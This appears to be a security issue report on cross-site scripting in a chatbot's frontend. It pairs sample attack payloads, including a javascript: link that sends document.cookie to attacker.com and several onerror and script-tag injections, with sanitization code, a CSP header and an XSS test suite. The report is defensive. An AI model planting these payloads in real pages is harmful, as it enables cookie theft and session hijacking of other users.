# Issue 005: Cross-Site Scripting (XSS) Vulnerability in Frontend

**Category:** Security  
**Severity:** High  
**Priority:** High  
**File:** `chatbot-enhanced.js`

## Problem Description

The frontend JavaScript code renders user and assistant messages without proper sanitization, creating XSS vulnerabilities. An attacker could inject malicious JavaScript that executes in the context of other users' browsers.

## Vulnerable Code Patterns

### 1. innerHTML Usage Without Sanitization

While the current code may use `textContent` in some places, any direct HTML rendering of untrusted content is dangerous:

```javascript
// Potential vulnerable pattern (need to verify in full file)
messageElement.innerHTML = message.content;
```

### 2. Markdown Rendering

If markdown is enabled (`enableMarkdown: true`), the markdown renderer might not properly sanitize HTML:

```javascript
// config.php line 33
enableMarkdown: true,
```

Markdown libraries often allow raw HTML by default, which can be exploited.

### 3. File Upload Preview

File previews might render untrusted filenames or content without sanitization.

## Attack Scenarios

### Scenario 1: Stored XSS via Chat Message

An attacker sends a message containing JavaScript:

```javascript
POST /chat-unified.php
{
  "message": "<img src=x onerror='alert(document.cookie)'>",
  "conversation_id": "conv_123"
}
```

If the assistant's response or the echoed message is rendered as HTML, the JavaScript executes.

### Scenario 2: Reflected XSS via URL Parameters

If configuration is passed via URL parameters:

```
https://example.com/chat?apiEndpoint=javascript:alert(1)
```

### Scenario 3: DOM-Based XSS via Message Content

```javascript
POST /chat-unified.php
{
  "message": "Click here: <a href='javascript:void(document.location=\"http://attacker.com?cookie=\"+document.cookie)'>Important Link</a>"
}
```

### Scenario 4: XSS via Filename

```javascript
POST /chat-unified.php
{
  "message": "Process this file",
  "file_data": [{
    "name": "<script>alert('XSS')</script>.pdf",
    "data": "..."
  }]
}
```

## Impact

- **High**: Session hijacking through cookie theft
- **High**: Credential theft
- **Medium**: Phishing attacks
- **Medium**: Malware distribution
- **Medium**: Defacement

## Recommendations

### 1. Implement DOMPurify for HTML Sanitization

```javascript
// Add DOMPurify library
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

// Or install via npm
npm install dompurify
```

### 2. Create Sanitization Helper

```javascript
const SecurityUtils = {
    /**
     * Sanitize HTML content to prevent XSS
     * @param {string} dirty - Untrusted HTML content
     * @param {object} options - DOMPurify options
     * @returns {string} Sanitized HTML
     */
    sanitizeHTML(dirty, options = {}) {
        const defaultOptions = {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
            ALLOWED_ATTR: ['href', 'target', 'class'],
            ALLOW_DATA_ATTR: false,
            ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
        };
        
        const config = { ...defaultOptions, ...options };
        
        if (typeof DOMPurify !== 'undefined') {
            return DOMPurify.sanitize(dirty, config);
        }
        
        // Fallback if DOMPurify not available (should never happen in production)
        console.error('DOMPurify not loaded - using basic escaping');
        return this.escapeHTML(dirty);
    },
    
    /**
     * Escape HTML special characters
     * @param {string} text - Text to escape
     * @returns {string} Escaped text
     */
    escapeHTML(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    },
    
    /**
     * Sanitize text for use in attributes
     * @param {string} text - Text to sanitize
     * @returns {string} Sanitized text
     */
    sanitizeAttribute(text) {
        return text
            .replace(/[<>"']/g, char => {
                const escapeChars = {
                    '<': '&lt;',
                    '>': '&gt;',
                    '"': '&quot;',
                    "'": '&#x27;'
                };
                return escapeChars[char];
            });
    },
    
    /**
     * Sanitize URL to prevent javascript: protocol
     * @param {string} url - URL to sanitize
     * @returns {string|null} Sanitized URL or null if dangerous
     */
    sanitizeURL(url) {
        if (!url) return null;
        
        // Decode to catch encoded javascript:
        const decoded = decodeURIComponent(url);
        
        // Check for dangerous protocols
        const dangerousProtocols = ['javascript:', 'data:', 'vbscript:', 'file:'];
        const lowerURL = decoded.toLowerCase().trim();
        
        for (const protocol of dangerousProtocols) {
            if (lowerURL.startsWith(protocol)) {
                console.warn('Dangerous URL protocol detected:', protocol);
                return null;
            }
        }
        
        // Only allow http, https, mailto, tel
        if (!/^(https?|mailto|tel):/.test(lowerURL) && !/^\//.test(lowerURL)) {
            return null;
        }
        
        return url;
    },
    
    /**
     * Sanitize filename for display
     * @param {string} filename - Filename to sanitize
     * @returns {string} Sanitized filename
     */
    sanitizeFilename(filename) {
        if (!filename) return '';
        
        // Remove any HTML tags
        filename = filename.replace(/<[^>]*>/g, '');
        
        // Escape special characters
        return this.escapeHTML(filename);
    }
};
```

### 3. Update Message Rendering

```javascript
class EnhancedChatBot {
    renderMessage(message, isUser = false) {
        const messageElement = document.createElement('div');
        messageElement.className = `chatbot-message ${isUser ? 'user' : 'assistant'}`;
        
        // Create message content container
        const contentElement = document.createElement('div');
        contentElement.className = 'message-content';
        
        // Sanitize content based on settings
        if (this.options.enableMarkdown && !isUser) {
            // Markdown for assistant messages only
            const rawMarkdown = message.content || message;
            const html = this.renderMarkdown(rawMarkdown);
            
            // Sanitize the rendered HTML
            const sanitized = SecurityUtils.sanitizeHTML(html, {
                ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 
                              'code', 'pre', 'blockquote', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'],
                ALLOWED_ATTR: ['href', 'target', 'class', 'rel'],
                KEEP_CONTENT: true
            });
            
            contentElement.innerHTML = sanitized;
        } else {
            // Plain text - use textContent (safe)
            contentElement.textContent = message.content || message;
        }
        
        // Apply link safety for assistant messages
        if (!isUser) {
            this.makeLinksSafe(contentElement);
        }
        
        messageElement.appendChild(contentElement);
        
        // Add timestamp if enabled
        if (this.options.timestamps) {
            const timestamp = document.createElement('span');
            timestamp.className = 'message-timestamp';
            timestamp.textContent = new Date().toLocaleTimeString();
            messageElement.appendChild(timestamp);
        }
        
        return messageElement;
    }
    
    /**
     * Make links safe by adding rel="noopener noreferrer" and validating URLs
     */
    makeLinksSafe(container) {
        const links = container.querySelectorAll('a');
        
        links.forEach(link => {
            // Validate URL
            const href = link.getAttribute('href');
            const sanitizedURL = SecurityUtils.sanitizeURL(href);
            
            if (!sanitizedURL) {
                // Remove dangerous link
                const text = document.createTextNode(link.textContent);
                link.parentNode.replaceChild(text, link);
                return;
            }
            
            // Update with sanitized URL
            link.setAttribute('href', sanitizedURL);
            
            // Add security attributes
            link.setAttribute('rel', 'noopener noreferrer');
            link.setAttribute('target', '_blank');
            
            // Add visual indicator for external links
            if (sanitizedURL.startsWith('http')) {
                link.classList.add('external-link');
            }
        });
    }
    
    /**
     * Render markdown safely
     */
    renderMarkdown(markdown) {
        // Use a markdown library like marked.js
        if (typeof marked !== 'undefined') {
            // Configure marked to be secure
            marked.setOptions({
                sanitize: false, // We'll use DOMPurify after
                breaks: true,
                gfm: true
            });
            
            return marked.parse(markdown);
        }
        
        // Fallback: basic markdown rendering
        return this.basicMarkdownRender(markdown);
    }
    
    basicMarkdownRender(text) {
        return text
            .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
            .replace(/\*(.+?)\*/g, '<em>$1</em>')
            .replace(/`(.+?)`/g, '<code>$1</code>')
            .replace(/\n/g, '<br>');
    }
    
    /**
     * Render file preview safely
     */
    renderFilePreview(file) {
        const preview = document.createElement('div');
        preview.className = 'file-preview';
        
        // Sanitize filename
        const safeName = SecurityUtils.sanitizeFilename(file.name);
        
        const filename = document.createElement('span');
        filename.className = 'file-name';
        filename.textContent = safeName; // Use textContent, not innerHTML
        
        const size = document.createElement('span');
        size.className = 'file-size';
        size.textContent = this.formatFileSize(file.size);
        
        preview.appendChild(filename);
        preview.appendChild(size);
        
        return preview;
    }
}
```

### 4. Content Security Policy (CSP)

Add CSP headers in `chat-unified.php` and `admin-api.php`:

```php
// In chat-unified.php (after CORS headers)
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.openai.com; font-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';");

// For development, use report-only mode first
header("Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report");
```

### 5. Input Validation on Backend

Even though frontend sanitizes, backend must also validate:

```php
// In ChatHandler::validateRequest
public function validateRequest($message, $conversationId, $fileData = null, $agentConfig = null) {
    // Existing validations...
    
    // Strip dangerous HTML from messages
    $message = $this->sanitizeMessage($message);
    
    // Validate message doesn't contain script tags
    if (preg_match('/<script|javascript:|on\w+=/i', $message)) {
        throw new Exception('Message contains potentially malicious content', 400);
    }
    
    // Additional validations...
}

private function sanitizeMessage(string $message): string {
    // Remove script tags
    $message = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $message);
    
    // Remove event handlers
    $message = preg_replace('/\s*on\w+\s*=\s*["\']?[^"\']*["\']?/i', '', $message);
    
    // Remove javascript: protocol
    $message = preg_replace('/javascript:/i', '', $message);
    
    return $message;
}
```

## Testing Requirements

### XSS Test Suite

```javascript
class XSSSecurityTest {
    constructor(chatbot) {
        this.chatbot = chatbot;
        this.testsPassed = 0;
        this.testsFailed = 0;
    }
    
    runAllTests() {
        console.log('üîí Running XSS Security Tests...\n');
        
        this.testScriptTag();
        this.testEventHandler();
        this.testJavaScriptProtocol();
        this.testImageOnerror();
        this.testDataURL();
        this.testSVGXSS();
        this.testFilenameXSS();
        
        console.log(`\nResults: ${this.testsPassed} passed, ${this.testsFailed} failed`);
        
        return this.testsFailed === 0;
    }
    
    testScriptTag() {
        const payload = '<script>alert("XSS")</script>';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('<script')) {
            console.error('‚ùå Script tag not removed');
            this.testsFailed++;
        } else {
            console.log('‚úÖ Script tag sanitized');
            this.testsPassed++;
        }
    }
    
    testEventHandler() {
        const payload = '<img src=x onerror="alert(1)">';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('onerror')) {
            console.error('‚ùå Event handler not removed');
            this.testsFailed++;
        } else {
            console.log('‚úÖ Event handler sanitized');
            this.testsPassed++;
        }
    }
    
    testJavaScriptProtocol() {
        const payload = '<a href="javascript:alert(1)">Click</a>';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('javascript:')) {
            console.error('‚ùå JavaScript protocol not removed');
            this.testsFailed++;
        } else {
            console.log('‚úÖ JavaScript protocol sanitized');
            this.testsPassed++;
        }
    }
    
    testImageOnerror() {
        const payload = '<img src="invalid" onerror="alert(document.cookie)">';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('onerror') || sanitized.includes('alert')) {
            console.error('‚ùå Image onerror not sanitized');
            this.testsFailed++;
        } else {
            console.log('‚úÖ Image onerror sanitized');
            this.testsPassed++;
        }
    }
    
    testDataURL() {
        const payload = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('data:text/html')) {
            console.error('‚ùå Dangerous data URL not removed');
            this.testsFailed++;
        } else {
            console.log('‚úÖ Dangerous data URL sanitized');
            this.testsPassed++;
        }
    }
    
    testSVGXSS() {
        const payload = '<svg onload="alert(1)">';
        const sanitized = SecurityUtils.sanitizeHTML(payload);
        
        if (sanitized.includes('onload') || sanitized.includes('<svg')) {
            console.error('‚ùå SVG XSS not prevented');
            this.testsFailed++;
        } else {
            console.log('‚úÖ SVG XSS prevented');
            this.testsPassed++;
        }
    }
    
    testFilenameXSS() {
        const filename = '<script>alert("XSS")</script>.pdf';
        const sanitized = SecurityUtils.sanitizeFilename(filename);
        
        if (sanitized.includes('<script')) {
            console.error('‚ùå Filename XSS not prevented');
            this.testsFailed++;
        } else {
            console.log('‚úÖ Filename XSS prevented');
            this.testsPassed++;
        }
    }
}

// Run tests
const tester = new XSSSecurityTest(chatbot);
tester.runAllTests();
```

## Estimated Effort

- **Effort:** 2-3 days
- **Risk:** Medium (requires thorough testing across all message types)

## Related Issues

- Issue 004: File upload security
- Issue 006: Markdown rendering security
- Issue 016: Content Security Policy headers
